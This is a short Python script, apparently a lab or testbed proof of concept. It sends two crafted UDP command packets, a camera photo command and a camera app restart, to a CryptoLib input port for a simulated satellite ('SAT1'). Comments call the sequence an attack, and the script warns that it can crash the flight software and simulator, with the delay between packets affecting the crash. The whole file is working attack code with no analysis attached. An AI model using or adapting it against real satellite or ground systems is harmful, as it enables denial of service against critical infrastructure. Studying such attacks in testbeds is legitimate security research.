import socket
import numpy as np
import time


def send_to_socket(IP, PORT, command):

	byte_message = bytes(command)

	opened_socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

	opened_socket.sendto(byte_message, (IP, PORT))	
	
	return

######

IP = "192.168.100.5"

# for SAT1
PORT = 6010 #6010 input port of CyptoLib for SAT1

# SPP labeled on the 8th octet (from 0x00 to 0x0F = 10+5) to sign the attack!

# CAM PHOTO 
command1 = [0x18,0xC8,0xC0,0x00,0x00,0x01,0x0C,0x0F] 

# CAM APP RESTART
command2 = [0x18,0x06,0xC0,0x00,0x00,0x15,0x06,0x0F,0x43,0x41,0x4D,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00] 

print("WARNING: this can crash the FSW and the simulator! ...If needed restart the VM !")
send_to_socket(IP, PORT, command1)
time.sleep(3) #the crash depends also on the delay between the two commands!
send_to_socket(IP, PORT, command2)
time.sleep(1)


